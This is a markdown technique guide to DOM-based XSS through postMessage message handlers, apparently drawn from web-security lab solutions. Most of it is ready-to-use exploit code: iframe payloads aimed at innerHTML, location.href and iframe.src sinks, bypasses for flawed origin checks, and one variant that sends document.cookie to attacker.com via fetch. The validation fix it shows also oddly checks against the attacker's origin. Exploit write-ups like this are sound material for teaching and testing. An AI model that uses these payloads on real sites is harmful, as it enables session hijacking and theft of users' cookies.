# DOM XSS — `postMessage` / Web Messages

## When this applies

The page registers a `window.addEventListener('message', ...)` handler that processes attacker-controllable data without origin validation, or with a flawed origin check (`indexOf`, `startsWith`, regex with unescaped `.`). The attacker hosts an iframe of the target and sends crafted messages from a malicious origin.

## Technique

The `postMessage` API allows cross-origin communication between windows:

```javascript
// Sending a message
targetWindow.postMessage(message, targetOrigin);

// Receiving a message
window.addEventListener('message', function(event) {
    // event.data - The message
    // event.origin - Sender's origin
    // event.source - Reference to sender window
});
```

Attacker delivery: serve an HTML page with `<iframe src="https://target.com">` and an `onload` handler that calls `postMessage`. When the victim visits the attacker's page, the iframe loads target, the message is sent, and the target's vulnerable handler processes it.

## Steps

### Pattern 1 — `innerHTML` Sink With No Origin Validation

#### Vulnerable Code
```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
}, false);
```

#### Vulnerability Analysis
- **No origin validation** - Accepts messages from any origin
- **Dangerous sink** - Direct innerHTML assignment
- **Attack vector** - Attacker-controlled iframe sends malicious message

#### Working Exploit

**Exploit Server Body:**
```html
<iframe src="https://target.com/"
        onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

#### How It Works

1. **iframe loads target page** containing the vulnerable listener
2. **onload event fires** when iframe finishes loading
3. **postMessage sends payload** to the iframe's window
4. **Target receives message** via event listener
5. **innerHTML sink executes** the img onerror payload

#### Payload Variations

```html
<!-- Basic alert -->
<iframe src="https://target.com/"
        onload="this.contentWindow.postMessage('<img src=1 onerror=alert(1)>','*')">
</iframe>

<!-- Print function -->
<iframe src="https://target.com/"
        onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
</iframe>

<!-- SVG vector -->
<iframe src="https://target.com/"
        onload="this.contentWindow.postMessage('<svg onload=alert(1)>','*')">
</iframe>

<!-- Multiple statements -->
<iframe src="https://target.com/"
        onload="this.contentWindow.postMessage('<img src=1 onerror=\"alert(1);alert(2)\">','*')">
</iframe>
```

#### Understanding the postMessage Call

```javascript
this.contentWindow.postMessage(message, targetOrigin)
```

- **`this`** - The iframe element
- **`contentWindow`** - The window object inside the iframe
- **`postMessage()`** - Sends message to that window
- **`'*'`** - Target origin (wildcard = any origin)

### Pattern 2 — Flawed `indexOf` Validation + `location.href`

#### Vulnerable Code
```javascript
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

#### Vulnerability Analysis
- **Flawed validation** - Uses `indexOf()` which checks for substring anywhere
- **Sink:** `location.href` - Can execute javascript: protocol
- **Bypass:** Append 'https:' after javascript: protocol in comment

#### Step-by-Step Solution

1. Analyze the validation logic.
2. Recognize `indexOf()` checks for substring anywhere in string.
3. Craft payload: `javascript:print()//https:`.
4. The `//` comments out everything after, including 'https:'.
5. Browser sees `javascript:print()` and executes it.

#### Working Exploit

**Exploit Server Body:**
```html
<iframe src="https://target.com/"
        onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
</iframe>
```

#### Payload Breakdown: `javascript:print()//https:`

1. **`javascript:print()`** - JavaScript protocol with function call
2. **`//`** - JavaScript single-line comment
3. **`https:`** - Required substring for validation (commented out)

#### How the Bypass Works

**Validation check:**
```javascript
url.indexOf('https:') > -1  // Returns position of 'https:' in string
// 'javascript:print()//https:'.indexOf('https:') → 22 (found!)
// Check passes
```

**Browser execution:**
```javascript
location.href = 'javascript:print()//https:'
// Browser interprets: javascript:print()
// Everything after // is a comment
```

#### Alternative Bypasses

```javascript
// Using comment
javascript:alert(1)//https:
javascript:alert(1)//http:

// Using both protocols
javascript:alert(1)/*https://example.com*/

// Multi-line comment
javascript:alert(1)/*
https:
*/
```

### Pattern 3 — `JSON.parse` + Unvalidated `iframe.src`

#### Vulnerable Code
```javascript
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe');
    var d = JSON.parse(e.data);
    switch(d.type) {
        case "load-channel":
            iframe.src = d.url;
            document.body.appendChild(iframe);
            break;
    }
}, false);
```

#### Vulnerability Analysis
- **JSON.parse()** - Safely parses JSON (not the vulnerability)
- **Dangerous sink** - `iframe.src` set to user-controlled value
- **Attack vector** - javascript: protocol in iframe src
- **No validation** - url property used directly

#### Working Exploit

**Exploit Server Body:**
```html
<iframe src="https://target.com/"
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

#### JSON Payload Structure

```json
{
    "type": "load-channel",
    "url": "javascript:print()"
}
```

**As string for postMessage:**
```javascript
'{"type":"load-channel","url":"javascript:print()"}'
```

#### Payload Variations

```html
<!-- Alert -->
<iframe src="https://target.com/"
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}","*")'>
</iframe>

<!-- Cookie theft -->
<iframe src="https://target.com/"
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:fetch(\\\"https://attacker.com?c=\\\"+document.cookie)\"}","*")'>
</iframe>

<!-- Data URI -->
<iframe src="https://target.com/"
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"data:text/html,<script>alert(1)</script>\"}","*")'>
</iframe>
```

### Origin Validation Bypasses (Advanced)

**1. indexOf() bypass:**
```javascript
// Vulnerable
if (e.origin.indexOf('trusted.com') > -1)
// Bypass: https://trusted.com.attacker.com
```

**2. startsWith() bypass:**
```javascript
// Vulnerable
if (e.origin.startsWith('https://trusted'))
// Bypass: https://trusted.attacker.com
```

**3. endsWith() bypass:**
```javascript
// Vulnerable
if (e.origin.endsWith('trusted.com'))
// Bypass: https://evilsite.trusted.com
```

**4. Regex bypass (unescaped dot):**
```javascript
// Vulnerable
if (e.origin.match(/https:\/\/trusted.com/))
// Bypass: https://trustedXcom (dot matches any character)
```

**5. Null origin:**
```javascript
// Some implementations check for null
if (e.origin === 'null') {
    // Sandboxed iframe has null origin
}
```

**Exploit for null origin:**
```html
<iframe sandbox="allow-scripts allow-forms"
        src="data:text/html,<script>
            parent.postMessage('payload', '*');
        </script>">
</iframe>
```

### Nested iframe Hijacking

```html
<iframe src="https://target.com/page" name="victim"></iframe>
<iframe src="https://target.com/page" onload="
    this.contentWindow.postMessage('malicious', '*');
"></iframe>
```

### Window.name Hijacking Combined with postMessage

```html
<script>
window.name = 'malicious_data';
window.location = 'https://target.com/vulnerable';
</script>
```

## Verifying success

- The exploit page (loaded by victim) renders the iframe; the iframe's vulnerable handler triggers the chosen sink (alert / fetch / redirect).
- DevTools Network tab in the iframe context shows the malicious request.
- Adding origin validation (`if (e.origin !== 'https://attacker.com') return;`) to the handler stops the exploit — confirms the missing origin check was the root cause.

## Common pitfalls

1. **Sending message before iframe loads** — race condition. Always use `onload`.
2. **`'*'` target origin in your `postMessage`** — fine for delivery, but defenders should never use `'*'` to *send* sensitive data; it's a separate vulnerability class on the *sender* side.
3. **Sandboxed iframe `null` origin** — `<iframe sandbox>` produces `event.origin === 'null'`. If the handler checks `=== 'null'` (string), this is exploitable.
4. **`JSON.parse` errors silently swallowed** — invalid JSON throws; wrap in try/catch and verify your payload parses.
5. **Quote escaping in nested HTML attribute** — single quotes for `onload`, double quotes for JSON, escape inner double quotes with `\"`. Test in a small HTML file first.

### Quote Escaping in JSON

**In HTML attribute (single quotes for attribute, double for JSON):**
```html
onload='...postMessage("{\"type\":\"load-channel\"}", "*")'
```

**In JavaScript string (must escape both):**
```javascript
var msg = "{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}";
```

## Tools

- **DOM Invader** — auto-detects message handlers and probes them
- **PortSwigger exploit server** — host the iframe payload
- **DevTools Console** — `frames[0].postMessage(...)` to test handlers manually
- **Browser-side handler logging**: `window.addEventListener('message', e => console.log(e.origin, e.data), true)` to dump all messages
